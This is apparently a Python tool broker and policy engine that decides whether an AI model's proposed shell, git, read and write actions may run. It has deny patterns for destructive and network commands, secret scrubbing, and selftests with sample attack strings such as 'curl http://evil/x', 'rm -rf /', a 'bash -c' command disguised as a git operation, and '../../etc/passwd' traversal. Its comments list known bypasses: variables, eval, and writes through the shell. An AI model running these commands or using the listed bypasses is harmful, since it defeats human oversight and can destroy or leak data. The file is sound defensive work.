#!/usr/bin/env python3
"""Tool Broker + Policy Engine (v2.36, Execution Engine Фаза 2, срез 2).

Голый API-рантайм (generic-orchestrator) не имеет своего tool loop — раньше модель лишь
возвращала текст. Здесь — контролируемое исполнение: модель ПРЕДЛАГАЕТ действие, а
разрешено ли оно, решает Policy Engine (уровни из security/permission-levels.yaml +
write_scope + config/protected-paths.yaml), НЕ модель. Broker исполняет только
разрешённое и собирает Evidence (команда, exit_code, ревизия, что тронуто).

Инвариант: execute() ВСЕГДА вызывает decide() первым и отказывает, если запрещено —
обойти политику через прямой вызов нельзя.

Действие: {"op": read|write|shell|git, "path": ..., "command": ..., "content": ...}.

Использование (программно; интегрируется в tools/orchestrator.py):
  from tool_broker import Policy, execute
  pol = Policy(level="controlled-write", write_scope=["src/"])
  ev = execute({"op": "write", "path": "src/a.ts", "content": "..."}, root, pol)

  tool_broker.py --selftest
"""

import json
import os
import re
import subprocess
import sys
from pathlib import Path

import yaml

# ВАЖНО (finding аудита исполнения): shell — НЕ полноценная security boundary. write_scope и
# protected_paths применяются к операциям read/write; для shell действуют только timeout +
# denylist деструктивных команд + scrub_env. Модель через shell МОЖЕТ писать вне write_scope
# (python -c open(...), tee, sed -i), читать файлы вне репо, ходить в сеть. Полный jail
# (worktree-only writable mount, HOME изолирован, сеть off, лимиты) = контейнер — НЕ реализован.
# Не давать --engine pipeline с живой моделью доступ к ценному приватному репо без надзора.
SHELL_TIMEOUT_DEFAULT = 300   # сек: shell-команда не висит вечно
# v2.85: хвост вывода shell для evidence. 400 было мало — сводка теста / список упавших node-id
# (для structured-id baseline-diff) часто НЕ попадали в окно -> регрессии терялись (fail-open).
SHELL_OUTPUT_TAIL = 4000
_READ_MAX = 20000   # v3.0-rc18: read отдаёт файл С НАЧАЛА до этого потолка (ревьюер верифицирует полноту)

PKG = Path(__file__).resolve().parents[1]


def _scrub_output(text):
    """v3.0.11 (finding аудита P1): редактировать секреты в output_tail (read-контент, stdout/stderr shell)
    ПЕРЕД тем, как он попадёт в evidence/отчёт. scrub_env закрывает окружение дочернего процесса, но
    напечатанный тул-ом токен или прочитанный committed .env иначе легли бы в evidence в открытом виде."""
    if not text:
        return text
    try:
        import security_scan as _ss
        for _name, _pat in _ss.SECRET_PATTERNS:
            text = _pat.sub("«***REDACTED-SECRET***»", text)
    except Exception:  # noqa: BLE001 — скраб не должен ронять брокер; в худшем случае — без редактирования
        pass
    return text


# уровни по возрастанию (security/permission-levels.yaml order)
LEVEL_ORDER = ["read-only", "controlled-write", "execution", "network", "privileged", "destructive"]
# что минимально требует операция
OP_MIN_LEVEL = {"read": "read-only", "write": "controlled-write", "shell": "execution", "git": "execution"}

# необратимые/опасные shell/git паттерны -> требуют уровня destructive + approval
DESTRUCTIVE_RE = re.compile(
    r"(rm\s+-rf|rm\s+-fr|\bmkfs\b|\bdd\s+if=|:\(\)\s*\{|>\s*/dev/sd|chmod\s+-R\s+777|"
    r"git\s+push\s+.*(--force|-f)\b|git\s+reset\s+--hard|git\s+clean\s+-[a-z]*f|"
    r"drop\s+table|truncate\s+table|curl[^|]*\|\s*(sh|bash)|force-with-lease)", re.I)


def _load(rel):
    try:
        return yaml.safe_load((PKG / rel).read_text(encoding="utf-8")) or {}
    except OSError:
        return {}


def _norm_entry(e, default_appr="required"):
    """Принимает как {path, approval}, так и строку 'path/' -> (prefix, approval)."""
    if isinstance(e, str):
        return (e.strip().rstrip("/"), default_appr) if e.strip() else None
    if isinstance(e, dict) and e.get("path"):
        return (str(e["path"]).rstrip("/"), e.get("approval", default_appr))
    return None


def _protected_prefixes(child_root=None):
    """Дефолт пакета + карта child'а (MERGE, не replace): child ДОБАВЛЯЕт к
    универсально-опасным путям, не отменяя их. Источники child'а:
      1. <child>/.ai-ops.yaml -> protected_paths (список строк) — единый источник;
      2. <child>/config/protected-paths.yaml (если есть) — как у пакета.
    Так Policy знает реальную карту репозитория (finding обкатки v2.36)."""
    out, seen = [], set()

    def add(entry):
        n = _norm_entry(entry)
        if n and n[0] and n[0] not in seen:
            seen.add(n[0]); out.append(n)

    for e in _load("config/protected-paths.yaml").get("protected_paths", []) or []:
        add(e)
    if child_root:
        child_root = Path(child_root)
        cfg = child_root / ".ai-ops.yaml"
        if cfg.exists():
            try:
                data = yaml.safe_load(cfg.read_text(encoding="utf-8")) or {}
                for e in data.get("protected_paths", []) or []:
                    add(e)
            except (OSError, yaml.YAMLError):
                pass
        cpp = child_root / "config" / "protected-paths.yaml"
        if cpp.exists():
            try:
                for e in (yaml.safe_load(cpp.read_text(encoding="utf-8")) or {}).get("protected_paths", []) or []:
                    add(e)
            except (OSError, yaml.YAMLError):
                pass
    return out


def _under(path: str, prefix: str) -> bool:
    p = path.strip("/")
    pre = prefix.strip("/")
    return p == pre or p.startswith(pre + "/")


# v2.81 Containment: сетевые команды (exfil/доставка в обход движка). Денайлист best-effort —
# НЕ настоящий сетевой jail (это контейнер), но закрывает частые векторы, когда allow_network=False.
NETWORK_RE = re.compile(r"\b(curl|wget|nc|ncat|netcat|ssh|scp|sftp|telnet|rsync|ftp|"
                        r"nmap|dig|nslookup|http|https)\b", re.I)
# git push из tool-loop: доставка ветки/PR — только доверенным кодом движка (pr_open), не моделью
# (finding аудита v2.79 P0.2). ЧЕСТНО (v2.85): это best-effort текстовый денай — quote-обфускацию
# снимаем нормализацией (_normalize), но ПЕРЕМЕННЫЕ/eval (`p=push; git $p`) статически не ловятся.
# Жёсткая гарантия недоставки — окружение (нет push-credentials / git-wrapper), не regex.
GIT_PUSH_RE = re.compile(r"\bgit\b[^\n;&|]*\bpush\b", re.I)

# v2.85/2.87: команду в allowlist-режиме проверяем ПОСЕГМЕНТНО (первый бинарь каждого сегмента),
# иначе chained/piped/background команды (`pytest && curl`, `x | nc`, `true & psql`) обходят
# allowlist по первому токену. Разделители: && || ; | и одиночный & (фон), плюс перевод строки.
_SHELL_SPLIT_RE = re.compile(r"&&|\|\||[;|&\n]")
# подстановка команд / process substitution — статически не проверить -> в allowlist-режиме денай.
_SUBST_RE = re.compile(r"\$\(|`|<\(|>\(")


def _normalize(cmd):
    """Снять кавычки для текстовых денай-проверок: `git pu\"\"sh` -> `git push` (quote-обфускация).
    ЧЕСТНО: переменные/eval так не раскрыть — это защита от кавычек, не полный разбор shell."""
    return (cmd or "").replace('"', "").replace("'", "")


class Policy:
    def __init__(self, level="controlled-write", write_scope=None, confidentiality="internal",
                 approvals=None, child_root=None, shell_mode="unrestricted",
                 shell_allowlist=None, allow_network=True, block_push=False):
        if level not in LEVEL_ORDER:
            raise ValueError(f"неизвестный уровень '{level}'")
        self.level = level
        self.write_scope = [s.strip("/") for s in (write_scope or [])]
        self.confidentiality = confidentiality
        self.approvals = set(approvals or [])   # набор одобренных ярлыков (напр. {'destructive'})
        # protected = дефолт пакета MERGE карта child'а (.ai-ops.yaml protected_paths)
        self.protected = _protected_prefixes(child_root)
        # v2.81 Containment (shell — не полноценный jail; enforceable-подмножество границы):
        #   shell_mode: unrestricted (обратная совместимость) | allowlist (только бинарь из
        #   shell_allowlist) | off (shell запрещён совсем). allow_network=False -> денай сетевых
        #   команд. block_push -> модель не может git push (доставка только через pr_open).
        if shell_mode not in ("unrestricted", "allowlist", "off"):
            raise ValueError(f"неизвестный shell_mode '{shell_mode}'")
        self.shell_mode = shell_mode
        self.shell_allowlist = set(shell_allowlist or [])
        self.allow_network = allow_network
        self.block_push = block_push

    def _level_ok(self, required):
        return LEVEL_ORDER.index(self.level) >= LEVEL_ORDER.index(required)

    def decide(self, action: dict) -> dict:
        op = action.get("op")
        if op not in OP_MIN_LEVEL:
            return {"allow": False, "reason": f"неизвестная операция '{op}'"}
        if not self._level_ok(OP_MIN_LEVEL[op]):
            return {"allow": False,
                    "reason": f"op '{op}' требует уровень >= {OP_MIN_LEVEL[op]}, текущий {self.level}"}

        if op == "read":
            rel = action.get("path") or ""
            if _escapes_root(rel):
                return {"allow": False, "reason": f"путь '{rel}' выходит за пределы репозитория (traversal)"}
            return {"allow": True, "reason": "чтение в пределах репозитория"}

        if op == "write":
            path = (action.get("path") or "").strip("/")
            if not path:
                return {"allow": False, "reason": "write без path"}
            # security (finding аудита): путь не должен выходить за корень (../, абсолютный)
            if _escapes_root(action.get("path") or ""):
                return {"allow": False, "reason": f"путь '{action.get('path')}' выходит за пределы репозитория (traversal)"}
            # protected path -> нужен privileged + approval
            for pre, appr in self.protected:
                if _under(path, pre):
                    if self._level_ok("privileged") and "protected_path_write" in self.approvals:
                        return {"allow": True, "reason": f"protected '{pre}' + approval"}
                    return {"allow": False,
                            "reason": f"protected path '{pre}' ({appr}) — нужен privileged + approval"}
            # вне write_scope -> запрет
            if self.write_scope and not any(_under(path, s) for s in self.write_scope):
                return {"allow": False,
                        "reason": f"'{path}' вне write_scope {self.write_scope}"}
            return {"allow": True, "reason": "запись в пределах write_scope"}

        # shell / git. Текстовые денай-проверки — по НОРМАЛИЗОВАННОЙ команде (снятые кавычки),
        # чтобы `git pu""sh` / `cu"r"l` не обходили денай quote-обфускацией (v2.85).
        cmd = action.get("command") or ""
        norm = _normalize(cmd)
        # v2.81 Containment: доставка (git push) — только доверенным движком (pr_open), не моделью.
        # best-effort (см. GIT_PUSH_RE): ловит кавычки/пробелы, НЕ ловит переменные/eval.
        if self.block_push and GIT_PUSH_RE.search(norm):
            return {"allow": False,
                    "reason": "git push из tool-loop запрещён (block_push, best-effort): доставка только "
                              "через движок (pr_open); жёсткая гарантия — окружение без push-credentials"}
        if DESTRUCTIVE_RE.search(norm):
            if self._level_ok("destructive") and "destructive" in self.approvals:
                return {"allow": True, "reason": "destructive + approval"}
            return {"allow": False,
                    "reason": "необратимая/опасная команда — нужен уровень destructive + approval"}
        # v3.0.11 (finding аудита P1): gauntlet применяется к op in (shell, git) — не только shell.
        # `op` контролирует модель: раньше {"op":"git","command":"bash -c ..."} исполнялся через
        # subprocess(shell=True), минуя shell_mode/allow_network/allowlist (git ветка в execute — тот же
        # shell=True). git-бинарь есть в allowlist, так что легитимные `git status/diff` проходят, а
        # посторонние бинарники/сеть/подстановка ловятся тем же денаем, что и для shell.
        if op in ("shell", "git"):
            if self.shell_mode == "off":
                return {"allow": False, "reason": f"{op} запрещён политикой (shell_mode=off; git тоже "
                                                   "исполняется как shell-команда)"}
            if not self.allow_network and NETWORK_RE.search(norm):
                return {"allow": False,
                        "reason": "сетевая команда запрещена (allow_network=False); это не полный "
                                  "jail, а enforceable-денай частых векторов"}
            if self.shell_mode == "allowlist":
                # подстановка команд ($()/backtick/<()) — статически не проверить -> денай
                if _SUBST_RE.search(cmd):
                    return {"allow": False,
                            "reason": "подстановка команд ($()/`…`/<()) запрещена в allowlist-режиме "
                                      "(нельзя статически проверить вложенные бинарники)"}
                # ПОСЕГМЕНТНО: каждый бинарь после ; && || | должен быть в allowlist (v2.85 —
                # иначе `pytest && curl` обходил проверку по первому токену)
                bad = [b for b in _command_binaries(norm) if b not in self.shell_allowlist]
                if bad:
                    return {"allow": False,
                            "reason": f"{bad} не в shell_allowlist {sorted(self.shell_allowlist)}"}
        return {"allow": True, "reason": f"{op} в пределах уровня {self.level}"}


# v2.81: типовые dev-инструменты (build/test/pkg + безопасное чтение) для shell_mode=allowlist.
# ЧЕСТНО (v2.85): это сужение ПОВЕРХНОСТИ входных бинарников, НЕ песочница исполнения. Многие из
# этих инструментов (python3/node/make/npm-scripts/pytest) по своей природе исполняют код репозитория
# — allowlist их не «обезвреживает», он лишь отсекает ad-hoc посторонние бинарники на входе. Полная
# изоляция ФС/сети/ресурсов — контейнер. Сырые интерпретаторы shell (bash/sh) УБРАНЫ: `bash -c "…"`
# — прямой обход без dev-обоснования на верхнем уровне.
SANDBOX_SHELL_ALLOWLIST = {
    # пакетные менеджеры / раннеры (исполняют код репо по своей сути — см. коммент выше)
    "npm", "npx", "yarn", "pnpm", "node", "corepack",
    "python", "python3", "pip", "pip3", "poetry", "uv", "pytest", "tox",
    "go", "cargo", "rustc", "mvn", "gradle", "./gradlew", "./mvnw", "make",
    "ruff", "mypy", "flake8", "black", "isort", "eslint", "tsc", "vitest", "jest",
    # безопасное чтение/навигация (модель исследует репо)
    "ls", "cat", "head", "tail", "grep", "rg", "find", "wc", "pwd", "echo",
    "git", "sed", "awk", "test", "true", "false",
}


def _first_binary(cmd):
    """Первый токен сегмента (бинарь) — для shell_mode=allowlist. Учитывает VAR=val префиксы."""
    for tok in (cmd or "").strip().split():
        if "=" in tok and not tok.startswith(("/", "./", "-")):
            continue                      # env-присваивание FOO=bar перед командой
        return tok
    return ""


def _command_binaries(cmd):
    """Все ведущие бинарники команды по сегментам (split по ; && || |) — для allowlist-проверки.
    Пустые сегменты (напр. только VAR=val) пропускаются. v2.85: закрывает обход `a && curl`/`a | nc`."""
    bins = []
    for seg in _SHELL_SPLIT_RE.split(cmd or ""):
        b = _first_binary(seg)
        if b:
            bins.append(b)
    return bins


def sandbox_policy(child_root=None, write_scope=None, allow_network=True):
    """v2.81 Containment: усиленная политика для pipeline с живой моделью — shell по allowlist
    dev-инструментов, доставка (git push) заблокирована. allow_network оставляем True по
    умолчанию (npm ci/pip нуждаются в сети на этапе установки); отдельные шаги могут ужесточать.
    ЧЕСТНО: это enforceable-подмножество; полная FS/сеть/ресурс-изоляция — контейнер (v2.81 доп.)."""
    return Policy(level="execution", child_root=child_root, write_scope=write_scope,
                  shell_mode="allowlist", shell_allowlist=SANDBOX_SHELL_ALLOWLIST,
                  allow_network=allow_network, block_push=True)


def _escapes_root(rel):
    """Лексически: путь выходит за корень рабочего дерева? (абсолютный или ../ после нормализации).
    Не требует реального root — защищает decide() до любого доступа к ФС."""
    if not rel:
        return False
    if os.path.isabs(rel):
        return True
    norm = os.path.normpath(rel)
    return norm == ".." or norm.startswith(".." + os.sep) or norm.startswith("../")


def _within_root(root, rel):
    """Belt-and-suspenders: итоговый путь физически внутри root (resolve, без симлинк-побега)."""
    try:
        (Path(root).resolve() / rel).resolve().relative_to(Path(root).resolve())
        return True
    except (ValueError, OSError):
        return False


# v2.63 (adversarial-review finding): denylist по именам дыряв (пропускал голый _KEY,
# DATABASE_URL/DSN/JWT/PAT…). Переход на ALLOWLIST: в shell-команду модели попадает ТОЛЬКО
# явно безопасное окружение; всё остальное (включая любые секреты под любыми именами) режется.
_ENV_ALLOW_EXACT = {
    # базовое окружение оболочки/сборки
    "PATH", "HOME", "LANG", "LANGUAGE", "TZ", "TERM", "SHELL", "USER", "LOGNAME",
    "HOSTNAME", "PWD", "OLDPWD", "TMPDIR", "TEMP", "TMP", "SHLVL",
    # тулчейны (не секреты)
    "NODE_ENV", "CI", "PYTHONPATH", "PYTHONUNBUFFERED", "PYTHONDONTWRITEBYTECODE",
    "VIRTUAL_ENV", "LD_LIBRARY_PATH", "GOPATH", "GOCACHE", "GOROOT", "JAVA_HOME",
    "CARGO_HOME", "RUSTUP_HOME", "PIP_CACHE_DIR", "npm_config_cache", "COLUMNS", "LINES",
    # НЕ-секретный контекст GitHub Actions (его отсутствие ломает build/test) — токены сюда НЕ входят
    "GITHUB_SHA", "GITHUB_REF", "GITHUB_REF_NAME", "GITHUB_REPOSITORY", "GITHUB_RUN_ID",
    "GITHUB_RUN_NUMBER", "GITHUB_WORKSPACE", "GITHUB_ACTIONS", "GITHUB_HEAD_REF",
    "GITHUB_BASE_REF", "GITHUB_EVENT_NAME",
    # base_url провайдера — не секрет (ключ OPENAI_COMPATIBLE_API_KEY НЕ в allowlist -> режется)
    "OPENAI_COMPATIBLE_BASE_URL", "GITHUB_API_URL",
}
_ENV_ALLOW_PREFIX = ("LC_", "XDG_")


def scrub_env(env=None, passthrough=None):
    """ALLOWLIST окружения для shell-команд Broker (finding adversarial-review: denylist по именам
    пропускал целые классы секретов — голый _KEY, DATABASE_URL/DSN/JWT/PAT…). В подпроцесс,
    команду которого предлагает модель, попадает ТОЛЬКО безопасное окружение: exact-allowlist +
    префиксы LC_/XDG_ + явный passthrough. Любой секрет под любым именем режется по умолчанию.
    passthrough — список имён, которые child осознанно разрешает (напр. нужная build-переменная).
    Полная FS/сеть-изоляция — контейнер (заявлено в постуре, не имитируется здесь)."""
    src = dict(os.environ if env is None else env)
    allow = set(_ENV_ALLOW_EXACT) | set(passthrough or [])
    return {k: v for k, v in src.items()
            if k in allow or k.startswith(_ENV_ALLOW_PREFIX)}


def _revision(root):
    # finding аудита (P0.5): полный SHA (не --short) — надёжный идентификатор ревизии,
    # к которому привязывается evidence; короткий SHA теоретически коллизирует.
    rc = subprocess.run(["git", "-C", str(root), "rev-parse", "HEAD"],
                        capture_output=True, text=True)
    return rc.stdout.strip() if rc.returncode == 0 else None


def execute(action: dict, root, policy: Policy) -> dict:
    """Единственная точка исполнения. ВСЕГДА проверяет policy.decide() первым."""
    root = Path(root)
    d = policy.decide(action)
    ev = {"op": action.get("op"), "target": action.get("path") or action.get("command"),
          "allowed": d["allow"], "reason": d["reason"], "revision": _revision(root)}
    if not d["allow"]:
        ev["ok"] = False
        return ev   # запрещено — НИЧЕГО не исполняем

    op = action["op"]
    try:
        # belt-and-suspenders: даже после dec() перепроверяем физическую границу (симлинки/resolve)
        if op in ("read", "write") and not _within_root(root, action.get("path") or ""):
            ev.update({"ok": False, "error": "путь выходит за пределы репозитория (containment)"})
            ev["allowed"] = False
            ev["reason"] = "traversal-guard: путь вне корня"
            return ev
        if op == "read":
            p = root / action["path"]
            text = p.read_text(encoding="utf-8", errors="ignore") if p.exists() else ""
            # v3.0-rc18: read отдаёт файл С НАЧАЛА (не хвост 400) — ревьюер верифицирует полноту.
            # v3.0-rc20 (finding аудита P1): ДИАПАЗОННОЕ чтение start_line/end_line (1-индекс, включительно)
            # для файлов > _READ_MAX — ревьюер под read-only не может sed/tail, ему нужен способ дочитать
            # хвост большого файла. Диапазон записывается в evidence (range).
            _sl = action.get("start_line")
            _el = action.get("end_line")
            rng = None
            if p.exists() and (_sl is not None or _el is not None):
                lines = text.splitlines(keepends=True)
                try:
                    s = max(1, int(_sl)) if _sl is not None else 1
                    e = int(_el) if _el is not None else len(lines)
                except (ValueError, TypeError):
                    s, e = 1, len(lines)
                seg = "".join(lines[s - 1:e])
                rng = {"start_line": s, "end_line": min(e, len(lines))}
                shown = seg if len(seg) <= _READ_MAX else (
                    seg[:_READ_MAX] + f"\n...[диапазон усечён на {_READ_MAX} симв.]")
            else:
                shown = text if len(text) <= _READ_MAX else (
                    text[:_READ_MAX] + f"\n...[файл усечён на {_READ_MAX} симв. из {len(text)}; "
                    "дочитай хвост через {\"op\":\"read\",\"start_line\":N,\"end_line\":M}]")
            ev.update({"ok": p.exists(), "bytes": len(text.encode("utf-8")),
                       "output_tail": _scrub_output(shown)})   # v3.0.11: редактируем секреты из контента
            if rng:
                ev["range"] = rng
        elif op == "write":
            p = root / action["path"]
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(action.get("content", ""), encoding="utf-8")
            ev.update({"ok": True, "bytes": len(action.get("content", "").encode("utf-8"))})
        else:  # shell / git — env со скрабленными секретами (модель не получает токены)
            timeout = action.get("timeout", SHELL_TIMEOUT_DEFAULT)
            try:
                r = subprocess.run(action["command"], shell=True, cwd=str(root),
                                   capture_output=True, text=True, env=scrub_env(),
                                   timeout=timeout)
                ev.update({"ok": r.returncode == 0, "exit_code": r.returncode,
                           "command": action["command"],
                           "output_tail": _scrub_output((r.stdout + r.stderr)[-SHELL_OUTPUT_TAIL:])})
            except subprocess.TimeoutExpired:
                # finding аудита: без timeout shell мог висеть вечно
                ev.update({"ok": False, "exit_code": None, "command": action["command"],
                           "timed_out": True, "output_tail": f"timeout {timeout}s"})
    except (OSError, KeyError) as e:
        ev.update({"ok": False, "error": str(e)})
    return ev


def selftest():
    import tempfile
    ok = True

    def expect(name, cond):
        nonlocal ok
        ok = ok and cond
        print(f"{'PASS' if cond else 'FAIL'} {name}")

    def _raises(fn):
        try:
            fn(); return False
        except Exception:
            return True

    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        subprocess.run(["git", "-C", td, "init", "-q"])
        subprocess.run(["git", "-C", td, "config", "user.email", "t@t"])
        subprocess.run(["git", "-C", td, "config", "user.name", "t"])
        (root / "src").mkdir()
        (root / "src" / "a.ts").write_text("x", encoding="utf-8")
        subprocess.run(["git", "-C", td, "add", "-A"])
        subprocess.run(["git", "-C", td, "commit", "-q", "-m", "init"])

        cw = Policy(level="controlled-write", write_scope=["src/"])
        expect("read разрешён", cw.decide({"op": "read", "path": "src/a.ts"})["allow"])
        expect("write в scope разрешён", cw.decide({"op": "write", "path": "src/b.ts"})["allow"])
        expect("write вне scope запрещён", not cw.decide({"op": "write", "path": "config/x.yaml"})["allow"])
        expect("write в protected (security/) запрещён",
               not cw.decide({"op": "write", "path": "security/x.yaml"})["allow"])
        expect("shell на controlled-write запрещён (нужен execution)",
               not cw.decide({"op": "shell", "command": "echo hi"})["allow"])

        # v3.0.11 (finding аудита P1): op:git проходит ТОТ ЖЕ gauntlet, что shell (op контролирует модель —
        # раньше git-ярлык обходил shell_mode/network/allowlist).
        _sb = Policy(level="execution", shell_mode="allowlist",
                     shell_allowlist={"git", "pytest"}, allow_network=False)
        expect("v3.0.11 git-gauntlet: bash -c под видом git -> денай (bash не в allowlist)",
               not _sb.decide({"op": "git", "command": "bash -c 'echo x'"})["allow"])
        expect("v3.0.11 git-gauntlet: сетевой curl под видом git -> денай (allow_network=False)",
               not _sb.decide({"op": "git", "command": "curl http://evil/x -O /tmp/x"})["allow"])
        expect("v3.0.11 git-gauntlet: легитимный git status -> allow (git в allowlist)",
               _sb.decide({"op": "git", "command": "git status"})["allow"])
        _off = Policy(level="execution", shell_mode="off")
        expect("v3.0.11 git-gauntlet: shell_mode=off -> git тоже запрещён (исполняется как shell)",
               not _off.decide({"op": "git", "command": "git status"})["allow"])
        # v3.0.11 (finding аудита P2): секрет в output_tail редактируется до попадания в evidence
        _pat = "ghp_" + "A" * 36
        expect("v3.0.11 scrub-output: github PAT в выводе редактируется (не утекает в evidence)",
               "ghp_" not in _scrub_output(f"printed token {_pat} done")
               and "REDACTED" in _scrub_output(_pat))

        # инвариант: execute запрещённого НЕ создаёт файл
        ev = execute({"op": "write", "path": "config/x.yaml", "content": "y"}, root, cw)
        expect("execute запрещённого -> allowed:false и файл не создан",
               ev["allowed"] is False and not (root / "config" / "x.yaml").exists())

        # разрешённая запись -> evidence с ревизией
        ev2 = execute({"op": "write", "path": "src/b.ts", "content": "hello"}, root, cw)
        expect("write выполнен + evidence с revision",
               ev2["ok"] and (root / "src" / "b.ts").exists() and ev2["revision"])

        ex = Policy(level="execution", write_scope=["src/"])
        expect("shell на execution разрешён", ex.decide({"op": "shell", "command": "echo hi"})["allow"])
        ev3 = execute({"op": "shell", "command": "echo hi"}, root, ex)
        expect("shell выполнен, exit_code 0", ev3["ok"] and ev3["exit_code"] == 0)
        expect("destructive shell запрещён без destructive+approval",
               not ex.decide({"op": "shell", "command": "rm -rf /"})["allow"])
        expect("git force-push запрещён",
               not ex.decide({"op": "git", "command": "git push --force origin main"})["allow"])

        dp = Policy(level="destructive", write_scope=["src/"], approvals=["destructive"])
        expect("destructive + approval разрешает опасную команду",
               dp.decide({"op": "shell", "command": "rm -rf build/"})["allow"])

    # v2.37: child-override protected-paths (finding обкатки — Policy знает карту child'а)
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        (root / ".ai-ops.yaml").write_text(
            "kind: ai-ops-child-config\nprotected_paths: [.github/workflows/]\n", encoding="utf-8")
        # write_scope включает .github/, но child объявил его protected
        cw = Policy(level="controlled-write", write_scope=[".github/", "src/"], child_root=root)
        expect("child protected (.github/workflows/) запрещён, хоть и в scope",
               not cw.decide({"op": "write", "path": ".github/workflows/ci.yml"})["allow"])
        expect("не-protected путь в scope по-прежнему разрешён",
               cw.decide({"op": "write", "path": "src/x.ts"})["allow"])
        expect("дефолт пакета сохраняется (merge, не replace): security/ запрещён",
               not cw.decide({"op": "write", "path": "security/x.yaml"})["allow"])
        # без child_root старое поведение: .github/ не защищён дефолтом
        no_child = Policy(level="controlled-write", write_scope=[".github/"])
        expect("без child_root .github/ не protected (дефолт пакета)",
               no_child.decide({"op": "write", "path": ".github/workflows/ci.yml"})["allow"])

        # SECURITY (finding аудита): path traversal — ../ и абсолютный путь запрещены на decide
        trav = Policy(level="execution", write_scope=["src/"])
        expect("write ../ escape запрещён (decide)",
               not trav.decide({"op": "write", "path": "../../etc/evil"})["allow"])
        expect("read ../ escape запрещён (decide)",
               not trav.decide({"op": "read", "path": "../../etc/passwd"})["allow"])
        expect("write абсолютный путь запрещён (decide)",
               not trav.decide({"op": "write", "path": "/etc/evil"})["allow"])
        # execute-guard: даже если бы decide пропустил — containment не даст записать вне корня
        ev_tr = execute({"op": "write", "path": "../escapee", "content": "x"}, root, trav)
        expect("execute traversal-guard: файл вне корня НЕ создан",
               not ev_tr["allowed"] and not (root.parent / "escapee").exists())
        expect("нормальный путь в scope по-прежнему пишется",
               execute({"op": "write", "path": "src/ok.ts", "content": "y"}, root, trav)["ok"])

        # v3.0-rc18 (finding живого прогона sonnet): read отдаёт файл С НАЧАЛА и целиком (не хвост 400),
        # иначе ревьюер видит обрезок и не может подтвердить полноту.
        big = "HEAD_MARKER\n" + ("строка контента\n" * 400) + "TAIL_MARKER"
        execute({"op": "write", "path": "src/big.txt", "content": big}, root, trav)
        ev_read = execute({"op": "read", "path": "src/big.txt"}, root, trav)
        expect("v3.0-rc18 read: виден НАЧАЛО файла (не только хвост 400 симв.)",
               "HEAD_MARKER" in ev_read.get("output_tail", "") and len(big) > 400
               and len(ev_read.get("output_tail", "")) > 400)
        # v3.0-rc20 (finding аудита P1): диапазонное чтение start_line/end_line + range в evidence
        ev_rng = execute({"op": "read", "path": "src/big.txt", "start_line": 1, "end_line": 1}, root, trav)
        expect("v3.0-rc20 read-range: только запрошенные строки (HEAD, без TAIL) + range в evidence",
               "HEAD_MARKER" in ev_rng.get("output_tail", "") and "TAIL_MARKER" not in ev_rng.get("output_tail", "")
               and ev_rng.get("range", {}).get("start_line") == 1 and ev_rng.get("range", {}).get("end_line") == 1)
        ev_tail = execute({"op": "read", "path": "src/big.txt", "start_line": 402}, root, trav)
        expect("v3.0-rc20 read-range: хвост после N-й строки доступен (TAIL_MARKER виден)",
               "TAIL_MARKER" in ev_tail.get("output_tail", ""))

        # SECURITY (finding аудита): секрет из env НЕ виден shell-команде, а PATH сохранён.
        # v3.0.4: фейковые «секреты» собраны в рантайме (без статического sk-литерала — downstream-сканеры
        # не флагуют тест). Значения всё равно проверяются на scrub из вывода shell.
        _tok = "sk-" + "super-secret-123"
        _key = "sk-ant" + "-xyz"
        os.environ["MY_FAKE_TOKEN"] = _tok
        os.environ["ANTHROPIC_API_KEY"] = _key
        try:
            ev_sec = execute({"op": "shell", "command": "echo TOK=[$MY_FAKE_TOKEN] KEY=[$ANTHROPIC_API_KEY] PATH_SET=${PATH:+yes}"},
                             root, trav)
            out = ev_sec.get("output_tail", "")
            expect("shell не видит секрет из env (scrub)",
                   _tok not in out and _key not in out
                   and "TOK=[]" in out and "KEY=[]" in out)
            expect("функциональный env (PATH) сохранён для сборки", "PATH_SET=yes" in out)
        finally:
            os.environ.pop("MY_FAKE_TOKEN", None); os.environ.pop("ANTHROPIC_API_KEY", None)
        expect("scrub_env allowlist: обычные env сохранены (PATH/NODE_ENV)",
               scrub_env({"PATH": "/bin", "NODE_ENV": "prod"}) == {"PATH": "/bin", "NODE_ENV": "prod"})
        # adversarial-review: denylist пропускал эти классы — allowlist режет их ВСЕ
        leaky = {"GITHUB_TOKEN": "1", "AZURE_OPENAI_KEY": "2", "STRIPE_KEY": "3",
                 "DATABASE_URL": "postgres://u:p@h/d", "SENTRY_DSN": "4", "JWT": "5",
                 "PAT": "6", "GEMINI_KEY": "7", "ENCRYPTION_KEY": "8", "PATH": "/bin"}
        scrubbed = scrub_env(leaky)
        expect("scrub_env allowlist: ВСЕ секреты (в т.ч. голый _KEY/URL/DSN/JWT/PAT) вырезаны",
               set(scrubbed) == {"PATH"})
        expect("scrub_env: не-секретный контекст GitHub сохранён (GITHUB_SHA), токен вырезан",
               scrub_env({"GITHUB_SHA": "abc", "GITHUB_TOKEN": "t"}) == {"GITHUB_SHA": "abc"})
        expect("scrub_env: passthrough пускает явно разрешённое",
               scrub_env({"MY_BUILD_FLAG": "1"}, passthrough=["MY_BUILD_FLAG"]) == {"MY_BUILD_FLAG": "1"})

        # v2.81 Containment: block_push — модель не может доставлять сама (push только движком)
        bp = Policy(level="execution", write_scope=["src/"], block_push=True)
        expect("block_push: git push запрещён", not bp.decide({"op": "git", "command": "git push origin x"})["allow"])
        expect("block_push: git push -u origin запрещён",
               not bp.decide({"op": "shell", "command": "git push -u origin feat"})["allow"])
        expect("block_push: обычный git (status/add/commit) по-прежнему разрешён",
               bp.decide({"op": "git", "command": "git status"})["allow"]
               and bp.decide({"op": "shell", "command": "git commit -m x"})["allow"])
        expect("block_push=False (дефолт): push разрешён политикой",
               Policy(level="execution").decide({"op": "shell", "command": "git push"})["allow"])

        # v2.81: shell_mode — off запрещает shell совсем; allowlist пускает только dev-бинарники
        off = Policy(level="execution", shell_mode="off")
        expect("shell_mode=off: любой shell запрещён", not off.decide({"op": "shell", "command": "ls"})["allow"])
        al = Policy(level="execution", shell_mode="allowlist", shell_allowlist={"npm", "pytest", "git"})
        expect("shell_mode=allowlist: npm разрешён", al.decide({"op": "shell", "command": "npm ci"})["allow"])
        expect("shell_mode=allowlist: env-префикс не сбивает бинарь (CI=1 npm test)",
               al.decide({"op": "shell", "command": "CI=1 npm test"})["allow"])
        expect("shell_mode=allowlist: произвольный бинарь (curl) запрещён",
